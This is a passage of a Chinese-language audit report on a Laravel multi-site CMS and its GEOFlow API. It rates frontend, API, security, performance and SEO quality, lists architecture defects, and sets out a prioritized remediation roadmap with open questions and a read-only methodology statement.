**缺失能力**：**无队列**（P3-5）；无 API 契约文档（P1-7 根因）；无 `composer audit` 可用的依赖审计（composer 命令不在环境）；无请求 ID 贯穿日志；`--parallel` 测试不可用（缺 ParaTest）。

**重复实现**：`Facts` 与 `Catalog` 并存（1645 行死代码）；`llms.txt` 双语两套实现；三份 URL 裁决逻辑；slug 生成 4 套写法（`EntitySlug` / `WizardController` / `GeoflowSync` / `SiteController`）；导航逻辑寄身 ServiceProvider。

**评级：功能覆盖度高（v1.0 范围内算完备），重复实现需清理**

### 3.6 前端与交互

**页面结构**：每页 h1 唯一、landmark 完整、canonical/hreflang 齐备（正面）。但 16 页中 13 页存在标题层级跳级（P2-9）。

**视觉一致性**：`docs/design-system.md` 定义完整（令牌 + 组件规范），前台大量消费 CSS 变量。**但表单错误态用蓝色 `--brand` 而非红色 `--error`**，直接违反自家规范 §3.1（P2-8）。`--error` 变量已正确注入却从未被消费。

**响应式**：断点 600/768/1025，`body{overflow-x:clip}` 兜底，参数表移动端转键值卡（`site.blade.php:1415-1423`）。**未做真机 375px 实测**（见「需进一步确认」）。

**交互一致性**：移动端菜单 JS 实现扎实（阻止背景滚动、768px 自动关闭、点链接关闭），但缺 ARIA 状态播报（P2-10）；无 skip link（P2-11）。

**易用性**：表单有加载态/错误态/成功态（`role="status"`），但加载中/失败态无 live region。

**对比度实测**（用实际生效值而非文档值）：

| 组合 | 对比度 | 判定 |
| --- | --- | --- |
| `--ink-faint #848991` on `#FFFFFF` | 3.52 | ✗ AA |
| `--ink-faint #848991` on `#surface-2 #F5F5F5` | 3.23 | ✗ AA |
| `--warning #E6A23C` on `#FFFFFF` | 2.19 | ✗ AA（严重） |
| `--ink-muted #6B7280` on `#FFFFFF` | 4.83 | ✓ |

**性能**：前台 CSS 全部内联（91KB，占 HTML 68%），`vite.config.js` 已配 Tailwind v4 但前台布局未消费（P3-11）。图片块实现规范（`loading="lazy"` + 宽高 + WebP 渐进增强），但站点 logo/footer logo 无 `width`/`height`（轻微 CLS 风险）。

**评级：中上（规范完备，细节违反与 a11y 欠债）**

### 3.7 与 GEOFlow 的对接

这是**缺陷最集中的模块**（9 个 P0/P1 中占 4 个）。

**接口契约**：`routes/api.php` 定义 4 端点，但 `README.md` 与 `DEPLOY.md` **全文无 geoflow 字样**，唯一描述在 `docs/audit/history/` 下的变更日志（对接方看不到）。契约事实上存在但未正式文档化，这是 P0-2（白名单与 schema 脱节）、P1-5、P1-7、B6 四个缺陷的**共同根因**。

| 端点 | 功能 | 问题 |
| --- | --- | --- |
| `POST geoflow/contents` | upsert | 开关检查 ✓、门禁 ✓、lock 保护 ✓，但白名单含已删列（P0-2）、指纹不全（P1-1）、null 丢弃（P1-2） |
| `GET geoflow/contents/{id}` | status | 响应无 `external_id`，上游无法确认对齐 |
| `POST geoflow/check` | 预检 | **无 `ok` 字段**、恒 200、类型防御缺失（P1-5） |
| `POST geoflow/unpublish` | 下架 | **不检查开关**（P0-3）、**不受 lock_manual 保护**（P1-3）、返回整个 Eloquent 模型（P1-7） |

**数据流转**：`external_id` 作为业务主键但无唯一约束（P1-4）。`type` 白名单仍含已退役的 `'product'`（`GeoflowSync.php:60`），上游传 `type=product` 会创建出「已退役类型」的新行，绕过退役治理。

**异常与重试**：
- ✅ 开关关闭时 upsert 返回 403 + `code:disabled`（设计正确）
- ✅ token 未配置时 fail-closed 返回 503
- ✅ 门禁拒绝返回完整 errors/warnings
- ❌ 未配置 token 返回 503 vs 无效 token 返回 401 —— 攻击者可据此判断系统是否已配置对接
- ❌ 无限流（`bootstrap/app.php` 全文无 `throttle`/`RateLimiter`），token 可被无限次爆破
- ❌ CORS 全开（实测预检返回 `Access-Control-Allow-Origin: *`），任意站点可发跨域请求
- ❌ token 明文入库 + 后台设置页明文展示

**认证**：已做对 `hash_equals` 防时序攻击、`Str::random(48)` 足够长、`regenerateToken` 有审计记录。缺：哈希存储、轮换宽限期（立即覆盖旧值，长连接上游会大面积 401）、防重放。

**评级：不合格（骨架方向正确，实现层多处断裂，两个核心承诺均未成立）**

### 3.8 非功能性

**安全**：

| 项 | 状态 |
| --- | --- |
| 认证授权 | ✅ 100+ 后台路由全覆盖；⚠️ `?site_slug=` 可被普通管理员利用（当前无此角色） |
| CSRF | ✅ 分组正确（web 启用 / api 豁免） |
| SQL 注入 | ✅ 全参数化，`orderByRaw` 用绑定参数，FTS 检索词经 CJK 分词+引号转义 |
| XSS | ❌ **Markdown 存储型 XSS（P0-1）**；✅ 搜索高亮先 `e()` 再插 `<mark>`；✅ HeadCodeSanitizer 用 DOMDocument 白名单 |
| 注入（命令/路径/XXE） | ✅ `app/` 全目录无 `exec`/`shell_exec`/`proc_open`；主题插件名来自 `glob()` + `array_key_exists` 校验 |
| 敏感信息 | ✅ `.env` 已忽略，`APP_DEBUG=false`，404 无堆栈泄露；❌ GEOFlow token 明文入库+明文展示 |
| 上传 | ✅ MIME 真探测（实测伪装文件被拒）、SVG 显式禁止；⚠️ `storage/app/public` 无 `.htaccess`（纵深防御缺失，当前不可利用） |
| Host 头 | ✅ **实测未复现投毒** —— `SITE_DEFAULT_FALLBACK=false` 时未知 Host 被拒（`.env.production.example:15` 默认 false，当前 `.env:8` 为 true） |
| 会话 | ⚠️ `lifetime=120` 分钟偏长；`SESSION_ENCRYPT=false`；`TrustProxies` 未配置，IP 可伪造（影响登录限流） |
| 限流 | ⚠️ 仅 2 处（表单提交 6 次/分 + 登录 5 次/5 分）；api 分组、admin 全后台、health 均无限流 |

**性能**：

| 项 | 实测 |
| --- | --- |
| 首个页面响应 | 200，约 3s（含 dev server 冷启动） |
| 整页缓存 | ✅ TTL 6h + 版本化失效；实测 5 连请求全 HIT，非白名单参数 BYPASS，ETag 304 正常 |
| 单页 SQL 数 | `/`=62、`/products/`=55、`/search`=104、`/cases/`=30（当前数据量） |
| schema 探测 | 每请求 3-9 次 `select exists (select 1 from sqlite_master...)` |
| 内联 CSS | 91KB/页，占 HTML 68%（P3-11） |
| SQLite 并发 | ⚠️ `busy_timeout`/`journal_mode` 均为 null，并发写入易 `database is locked` |
| 测试执行 | ⚠️ 单文件 13-63s，全量 Feature 需 40+ 分钟；`--parallel` 不可用 |

**稳定性**：
- ✅ 降级合理：FTS 不可用自动回落 LIKE；主题加载失败回退 default；搜索/图片失败不阻塞主流程
- ❌ 异常无统一报告入口（P0-8）
- ❌ 邮件/图片压缩同步执行（P3-5）
- ❌ sitemap/llms/feed 响应头 `Cache-Control: public, max-age=3600` —— 若前置 CDN，下架内容最多 1 小时仍出现在 sitemap

**可观测性**：
- ❌ 无请求 ID 贯穿日志，`.env:24` 为 `LOG_LEVEL=debug`（生产应 `warning`）
- ❌ 日志无 site_id 上下文（多站系统排障致命）
- ⚠️ `/api/v1/health` 无鉴权且泄露内容总数与已发布数（`{"db":{"contents":6,"published":6}}`），DB 慢时探活同步变慢
- ✅ 审计日志 `audit_logs` 表存在且有 51 行，30+ 处写操作埋点
- ✅ `X-Page-Cache: HIT/MISS/BYPASS` 便于验证缓存行为

**评级：安全中等偏下（XSS 是硬伤）、性能中等、稳定性中等、可观测性偏弱**

### 3.9 GEO/SEO 效果

**结构化数据**：JSON-LD 100% 与可见内容一致，这是最重要的一条 —— 避开 Google「结构化数据须代表页面可见内容」的处罚风险。`publisher` 用 `@id` 引用（写法正确）。

缺陷：
- Product 缺 `image`（P1-13）→ 富结果无法出图
- Article 缺 `image` 与 `author`（P1-13）
- Organization `@id` 跨语言冲突（P1-14）→ 实体图谱被错误合并，LLM 指代歧义
- CaseStudy 有自定义 Schema（CHANGELOG 记录 18R）

**AI 可解析性**：

| 产出 | 中文 | 英文 | 判定 |
| --- | --- | --- | --- |
| `/geo.json` | 40,352B（12 实体/58 关系/17 事实） | 29,035B（6 实体/21 关系/**17 事实全中文**） | ❌ facts 层未本地化（P0-9） |
| `/llms.txt` | 6,031B（8 章节/4 产品/11 facts） | 2,478B（7 章节/2 产品/7 facts） | ⚠️ 英文版稀薄，丢失实体命名约束（P3-8） |
| `/sitemap.xml` | 4,825B | — | ⚠️ lastmod 虚高（P1-15） |
| `/feed.xml` | 1,594B | — | ✅ |
| `/robots.txt` | 1,779B | — | ✅ 放行 30+ AI 爬虫 |

**语义可读性**：定义性文字规范（首段结论先行）、实体命名一致、有 FAQ/要点结构化清单。

**SEO 基础**：canonical 每页唯一、hreflang 中英互指 + x-default、OG/Twitter Card 齐备。缺陷：知识中心栏目页 meta description 多页重复（P2-13）。

**模板对 GEO 的影响**：8 个行业模板共用 `default` 主题，Schema 由 `layouts/site.blade.php` 统一注入 —— **换模板不降级**，这是多租户模式下的关键正向结论。

**评级：产出机制设计优秀（中上），但英文 GEO 层存在致命短板（P0-9）**

---

## 4. 缺陷清单（架构与技术债）

| 编号 | 缺陷 | 位置 | 影响 |
| --- | --- | --- | --- |
| D-1 | 三条数据访问路径并存，Repository 层被完全绕过 | `EntityRepository` 零生产引用 | 新成员按 `Repositories/` 理解架构会走错方向；Repository 的 6 个测试全绿但生产无人用它，构成虚假信心 |
| D-2 | 导航/页脚业务逻辑寄身 ServiceProvider | `AppServiceProvider.php:189-616` | 依赖静态方法 + 全局 memo + `Cache::remember`，无法单元测试 |
| D-3 | 缓存失效模型清单硬编码 | `AppServiceProvider.php:93-102` | 新增前台展示模型若忘记改此列表 → 页面缓存不失效 → 用户看到旧页面（`Form` 已在 `templates.php:35` 用于前台 block 但不在清单内） |
| D-4 | 实体类型硬编码 72 处/17 文件 | `Catalog`(19) `EntityController`(16) `WizardController`(6) 等 | Registry 注释「禁止散点硬编码」已与代码不符，注释成了误导 |
| D-5 | 1645 行死代码（`Facts` + `config/facts.php`） | 生产零引用 | 部署方会误以为需准备 `facts.yaml`（`scripts/compile_facts.php` 仍留仓） |
| D-6 | 14 个测试扫描源码文本 | `SeoHttpIntegrationTest:273-292` 等 | 重构必假失败，团队易养成「测试红了就改断言」的习惯 |
| D-7 | 单元测试仅 7 个 vs Feature 120 个 | `tests/Unit` | 业务逻辑全在静态类+全局状态，无法不起应用就测试 |
| D-8 | 52 个超 300 行方法 | 最大 `ThemePalette::resolve()` 276 行 | 可读性与可测性 |
| D-9 | slug 生成 4 套写法 | `EntitySlug` / `WizardController:74` / `GeoflowSync:209` / `SiteController:259` | 两处不处理空串（依赖模型层兜底，读代码无法判断哪里需担心） |
| D-10 | 无 API 契约文档 | `README`/`DEPLOY` 全文无 geoflow | P0-2/P1-5/P1-7 的共同根因 |
| D-11 | 测试无法并行 | 缺 `brianium/paratest` | 全量 Feature 需 40+ 分钟，CI 成本高 |
| D-12 | 开发库残留测试垃圾表 | `t`(2行) / `cr`(1行)，无对应迁移 | 污染 dev 环境；`cr` 与 `content_revisions` 结构相似易误认 |

---

## 5. 风险优先级与修复路线

### 5.1 第一批：立即修复（安全 + 数据完整性）

| 项 | 理由 |
| --- | --- |
| P0-1 Markdown XSS | 唯一可远程触发的安全漏洞，且经 GEOFlow API 放大 |
| P0-3 unpublish 绕过开关 | 紧急止杀手段失效，生产事故级 |
| P0-2 白名单含已删列 | 上游按文档实现即崩 |
| P0-5 slot 全局唯一索引 | 多站写入必然冲突 |
| P0-7 content_tag 缺 site_id | 跨站数据可见性缺陷 |
| P0-8 异常处理为空 | 可观测性为零 + API 契约破坏 |

### 5.2 第二批：本迭代内完成（功能正确性）

P0-4（API 站点解析）、P0-6（软删唯一索引）、P0-9（en geo.json facts）、P1-1（指纹覆盖）、P1-3（unpublish 锁保护）、P1-4（external_id 唯一约束）、P1-7（响应契约统一）

**建议先补 `docs/api/geoflow-v1.md`（OpenAPI 3.1），以文档驱动重写 `GeoflowController` 的入参校验与出参构造**，可一次性消除 P0-2/P1-5/P1-6/P1-7 一批契约缺陷。

### 5.3 第三批：跨库能力决策（需管理层拍板）

**问题：是否真的要支持 MySQL/PostgreSQL？**

P1-9 的修复方向完全取决于此：
- 若确定只支持 SQLite → 改 `README.md:24` 一行，删除 `.env.example:27-29` 的 MySQL 变量，4 个含 `PRAGMA` 的迁移加显式驱动守卫报错
- 若要支持 → 6 个文件的 partial index 需改生成列方案，4 个 SQLite 专有 DDL 需重写，并加 CI 三驱动矩阵

**同时需决策**：`config/facts.php` 是否含真实业务数据？决定 D-5 是普通删除还是需清理 git 历史。

### 5.4 第四批：架构收敛

D-2（导航逻辑搬迁，低风险纯搬迁）、D-3（缓存失效改反向声明）、D-4（Registry 加自检测试）、P3-7（llms 双语收敛）、D-1/D-5（删死代码）

### 5.5 第五批：GEO 效果提升

P1-13（Product image/author）、P1-14（Organization @id）、P1-15（sitemap lastmod）、P2-8（错误态配色）、P2-9/10/11/12（a11y 与对比度）、P3-11（CSS 外链）

### 5.6 风险登记表

| 风险 | 概率 | 影响 | 缓解措施 |
| --- | --- | --- | --- |
| 生产用 MySQL 部署失败 | 中 | 高 | 立即做五批第三项决策 |
| GEOFlow token 泄露 → 全站 XSS | 中 | 极高 | P0-1 修复 + token 哈希存储 |
| 内容 slug 回收站功能不可用 | 高 | 中 | P0-6 修复（SQLite 已有部分唯一索引支持） |
| 多站 GEOFlow 对接需求落地 | 中 | 中 | P0-4 修复 |
| 内容量增长后前台变慢 | 高 | 中 | P1-10/P1-11 + 复合索引 |
| 依赖存在未知 CVE | 未知 | 未知 | 环境无 composer，需补 `composer audit` |
| 后台引入多用户后跨站越权 | 低 | 高 | P2-14 限制 `?site_slug=` 为超管专用 |

---

## 6. 需进一步确认

1. **`contents_slot_unique` 是否为有意设计**（如「叙事插槽跨站共享文案」）？代码注释未说明意图，`Narrative.php:17-18` 称 slot 是站点内容，倾向判断为遗漏 `site_id` 的缺陷，但需产品确认。
2. **生产实际数据库类型**：`.env` 为 SQLite，`.env.production.example` 需确认。若已用 MySQL，P1-9 应已暴露；若是 PG，仅 P0-6 需注意。
3. **`entities` 是否需要软删**：当前用 `status='archived'` 替代下线，若未来加软删将复制 P0-6 问题。
4. **移动端未做真机验证**：断点、`overflow-x:clip`、参数表转键值卡均从 CSS 推断合理，未在 375px 实测截图。`overflow-x:clip` 虽防页面级横滚，但会掩盖子元素溢出。
5. **依赖 CVE 未审计**：环境无 `composer` 命令，无法运行 `composer audit`。已读取版本：`laravel/framework v12.69.2`、`league/commonmark 2.10.1`、`symfony 7.4.18`、`guzzlehttp/guzzle 7.15.5`。**未编造任何 CVE 编号**。
6. **后台 20 个子目录未做前端审阅**：已顺带发现后台硬编码 hex 违反 design-system §3.3（如 `admin/settings/form.blade.php:17,23`），但未逐页验证影响面。
7. **Feature 套件已全量跑完**：125 个文件逐个执行，125 PASS / 0 FAIL / 0 TIMEOUT，确认无隐藏失败。
8. **`t`/`cr` 垃圾表创建者未知**：仓库内已无对应代码，需查 shell history 确认。

---

## 7. 评估方法与声明

**方法**：
- 5 个独立只读审阅通道并行（架构/技术、数据库、业务与 GEOFlow、安全与非功能、前端与 GEO/SEO）
- 主审阅方独立复现子代理报告中的每一条 P0（XSS 渲染、slot 唯一索引、content_tag 缺列、GEOFlow 白名单脱节、开关绕过、API 中间件链、en geo.json facts 本地化）
- HTTP 端到端实测：前台 10 个 URL + 5 个 GEO 端点
- 全量测试基线：Unit 61 passed + Feature 125 文件逐个执行全绿
- SQLite schema 探查：`sqlite_master`、`PRAGMA table_info`、`foreign_key_list`、执行计划

**未做的验证**：
- 未在 MySQL/PostgreSQL 上实际执行 `migrate:fresh`（环境无实例），跨库结论基于方言差异静态分析
- 未做压力测试（当前数据量 18 实体/58 关系，N+1 与索引问题未在真实负载下暴露）
- 未做移动端真机/无头浏览器验证
- 未执行依赖 CVE 审计（无 composer 命令）

**只读声明**：全程未修改任何项目文件、未写数据库、未执行 `migrate`。仅运行只读 PDO 查询与 HTTP GET。`git status` 中的既有改动为本次评估开始前已存在。

---

*报告结束。50 项发现（9 P0 / 16 P1 / 14 P2 / 11 P3）+ 12 项架构缺陷 + 12 项测试基线数据。*
